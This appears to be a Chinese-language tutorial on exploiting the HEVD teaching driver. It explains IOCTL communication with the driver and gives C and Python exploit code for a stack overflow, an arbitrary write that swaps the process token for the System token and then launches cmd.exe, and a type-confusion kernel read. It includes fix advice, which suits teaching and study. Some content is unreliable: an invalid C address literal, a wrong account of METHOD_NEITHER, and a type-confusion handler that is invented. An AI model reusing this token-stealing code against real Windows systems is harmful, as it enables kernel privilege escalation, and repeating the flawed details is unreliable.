HANDLE hDevice = CreateFile("\\\\.\\MyDriver", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
ULONG_PTR targetAddr = 0xFFFFF800`01234567;
ULONG readVal;
DeviceIoControl(hDevice, IOCTL_READ_MEM, &targetAddr, sizeof(targetAddr), &readVal, sizeof(readVal), NULL, NULL);

该示例未做任何安全检查，实际利用中需绕过SMEP、KASLR等。HEVD驱动正是利用此类IOCTL实现任意地址读写漏洞。漏洞成因是驱动未验证用户提供的地址是否属于用户空间，导致内核可被任意读写。修复方法：使用ProbeForRead/ProbeForWrite检查地址范围，或使用MmUserProbeAddress等。

HEVD（HackSys Extreme Vulnerable Driver）是一个用于教学的内核驱动，它通过创建符号链接（如\\.\HackSysExtremeVulnerableDriver）暴露给用户态。驱动在DriverEntry中调用IoCreateDevice创建设备对象，并设置IRP_MJ_DEVICE_CONTROL分发函数。IOCTL通信的核心是设备控制码（IOCTL code），由CTL_CODE宏定义，包含设备类型、功能码、访问权限和数据传输方法。例如，HEVD中栈溢出漏洞的IOCTL码为0x222003（CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)）。METHOD_NEITHER表示用户态输入缓冲区直接映射到内核虚拟地址，驱动通过Irp->AssociatedIrp.SystemBuffer或Irp->MdlAddress访问。用户态使用DeviceIoControl函数发送请求，第一个参数是CreateFile返回的句柄，第二个参数是IOCTL码，后面是输入输出缓冲区。以下是一个用户态发送IOCTL的C代码示例：

c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                                  GENERIC_READ | GENERIC_WRITE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device: %d\n", GetLastError());
        return 1;
    }

    // 构造输入缓冲区，例如栈溢出漏洞需要覆盖返回地址
    char inputBuffer[0x1000] = {0};
    DWORD bytesReturned = 0;
    BOOL success = DeviceIoControl(hDevice,
                                   0x222003,  // 栈溢出IOCTL码
                                   inputBuffer, sizeof(inputBuffer),
                                   NULL, 0,
                                   &bytesReturned, NULL);
    if (success) {
        printf("IOCTL sent successfully\n");
    } else {
        printf("DeviceIoControl failed: %d\n", GetLastError());
    }
    CloseHandle(hDevice);
    return 0;
}


该代码打开设备，发送大小为0x1000的输入缓冲区，触发驱动中的栈溢出漏洞。驱动内部会调用TriggerStackOverflow函数，将用户输入拷贝到局部缓冲区而不检查大小，导致栈上返回地址被覆盖。理解IOCTL通信机制是后续漏洞利用的基础。

HEVD的任意地址写入漏洞位于TriggerArbitraryWrite函数中。该函数允许用户态指定一个目标地址（Where）和要写入的值（What），然后驱动直接将What写入Where指向的内存。漏洞代码如下（简化）：

c
NTSTATUS TriggerArbitraryWrite(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
    PULONG_PTR userBuffer = (PULONG_PTR)Irp->AssociatedIrp.SystemBuffer;
    ULONG_PTR where = userBuffer[0]; // 用户控制的目标地址
    ULONG_PTR what = userBuffer[1];  // 用户控制的值
    *(ULONG_PTR*)where = what;       // 任意地址写入
    return STATUS_SUCCESS;
}


用户态传入一个包含两个指针的结构体：第一个是目标地址，第二个是写入值。驱动未对where进行任何校验（如检查是否在内核地址范围、是否可写等），导致攻击者可以写入任意内核内存。利用该漏洞实现提权的经典方法是修改当前进程的EPROCESS结构中的Token指针，将其指向System进程的Token。首先需要获取System进程的EPROCESS地址和当前进程的EPROCESS地址。通常通过遍历ActiveProcessLinks链表或利用其他信息泄露漏洞。以下是一个利用该漏洞修改Token的C代码示例（假设已获得System EPROCESS地址和当前EPROCESS地址）：

c
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef struct _ARBITRARY_WRITE {
    ULONG_PTR Where;
    ULONG_PTR What;
} ARBITRARY_WRITE, *PARBITRARY_WRITE;

// 假设通过其他方式获取了System EPROCESS和当前EPROCESS的Token偏移
#define TOKEN_OFFSET 0x358  // Win10 x64 1909

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                                  GENERIC_READ | GENERIC_WRITE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device: %d\n", GetLastError());
        return 1;
    }

    // 假设已通过信息泄露获得以下地址（示例值）
    ULONG_PTR currentEPROCESS = 0xFFFFF80012345678; // 当前进程EPROCESS
    ULONG_PTR systemEPROCESS = 0xFFFFF80087654321;  // System进程EPROCESS

    // 读取System进程的Token
    ULONG_PTR systemToken = 0;
    // 需要先利用任意地址读取漏洞读取systemEPROCESS+TOKEN_OFFSET，这里假设已读取
    // 或者直接写入当前进程的Token为systemToken
    // 由于我们只有任意写，需要先知道systemToken的值，或者通过写当前进程Token指针指向systemToken
    // 更简单的方法：将当前进程的Token指针直接修改为systemEPROCESS+TOKEN_OFFSET处的值
    // 但任意写只能写一个值，不能读。因此需要结合任意读或提前知道systemToken。
    // 这里演示直接写当前进程Token为已知的systemToken（假设已通过其他方式获得）
    ULONG_PTR systemTokenValue = 0xFFFFF800AABBCCDD; // 假设值

    ARBITRARY_WRITE aw;
    aw.Where = currentEPROCESS + TOKEN_OFFSET;
    aw.What = systemTokenValue;

    DWORD bytesReturned = 0;
    BOOL success = DeviceIoControl(hDevice,
                                   0x22200B,  // ArbitraryWrite IOCTL码（HEVD中通常为0x22200B）
                                   &aw, sizeof(aw),
                                   NULL, 0,
                                   &bytesReturned, NULL);
    if (success) {
        printf("Token overwritten successfully\n");
        // 此时当前进程已拥有System权限
        system("cmd.exe");
    } else {
        printf("DeviceIoControl failed: %d\n", GetLastError());
    }
    CloseHandle(hDevice);
    return 0;
}


实际利用中，需要先通过任意地址读取漏洞（HEVD中也有ArbitraryRead）获取systemToken，或者通过遍历进程链表找到System的Token。漏洞修复：驱动应验证where地址是否属于用户态可写范围（如使用ProbeForWrite），或者限制只能写入驱动分配的缓冲区。

HEVD的类型混淆漏洞位于TriggerTypeConfusion函数中。该函数接收用户态传入的一个结构体，其中包含一个类型标识符（Type）和一个联合体（Union）。驱动根据Type的值将联合体解释为不同的数据结构（例如整数或指针），但未对Type进行有效验证，导致攻击者可以传入一个类型值，使得驱动将用户控制的数据错误地解释为指针，从而实现任意地址读写。漏洞简化代码如下：

c
typedef struct _TYPE_CONFUSION {
    ULONG Type;  // 0: 整数模式, 1: 指针模式
    union {
        ULONG Value;
        ULONG_PTR Pointer;
    } u;
} TYPE_CONFUSION, *PTYPE_CONFUSION;

NTSTATUS TriggerTypeConfusion(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
    PTYPE_CONFUSION userInput = (PTYPE_CONFUSION)Irp->AssociatedIrp.SystemBuffer;
    if (userInput->Type == 0) {
        // 整数模式：将Value作为整数处理
        ULONG result = userInput->u.Value * 2;
        // ...
    } else if (userInput->Type == 1) {
        // 指针模式：将Pointer作为地址解引用
        ULONG_PTR value = *(ULONG_PTR*)userInput->u.Pointer;  // 任意读
        // 或者写入
        *(ULONG_PTR*)userInput->u.Pointer = 0x12345678;       // 任意写
    }
    return STATUS_SUCCESS;
}


触发条件：用户设置Type=1，并在Pointer字段填入任意内核地址，驱动会直接解引用该地址。如果驱动同时提供写入操作，则可以实现任意地址写入。利用思路：通过设置Type=1，Pointer为目标地址，驱动会读取该地址的值并返回给用户（如果输出缓冲区存在），或者写入固定值。但通常HEVD的TypeConfusion只提供读取，不提供写入。不过我们可以结合其他漏洞或利用该读取泄露内核基址。以下是一个利用TypeConfusion进行任意地址读取的Python示例（假设IOCTL码为0x222013）：

python
import ctypes
from ctypes import wintypes

IOCTL_TYPE_CONFUSION = 0x222013

hDevice = ctypes.windll.kernel32.CreateFileW(
    "\\\\.\\HackSysExtremeVulnerableDriver",
    0xC0000000, 0, None, 3, 0, None)

class TYPE_CONFUSION(ctypes.Structure):
    _fields_ = [
        ("Type", ctypes.c_ulong),
        ("Pointer", ctypes.c_ulonglong)  # 64位
    ]

def read_kernel(address):
    input_buf = TYPE_CONFUSION()
    input_buf.Type = 1
    input_buf.Pointer = address
    output_buf = (ctypes.c_ulonglong * 1)()
    bytes_returned = ctypes.c_ulong()
    ctypes.windll.kernel32.DeviceIoControl(
        hDevice, IOCTL_TYPE_CONFUSION,
        ctypes.byref(input_buf), ctypes.sizeof(input_buf),
        ctypes.byref(output_buf), ctypes.sizeof(output_buf),
        ctypes.byref(bytes_returned), None)
    return output_buf[0]

# 示例：读取内核某个地址
addr = 0xFFFFF80012345678
try:
    value = read_kernel(addr)
    print(f"Value at {hex(addr)}: {hex(value)}")
except Exception as e:
    print(f"Error: {e}")


注意：实际利用中，驱动可能没有输出缓冲区，或者读取的值不会返回给用户。需要逆向分析具体实现。如果驱动在指针模式下执行了写入操作（如将固定值写入Pointer地址），则可以实现任意写。漏洞修复：驱动应验证Type值是否合法，并对Pointer地址进行有效性检查（如使用ProbeForRead/ProbeForWrite）。

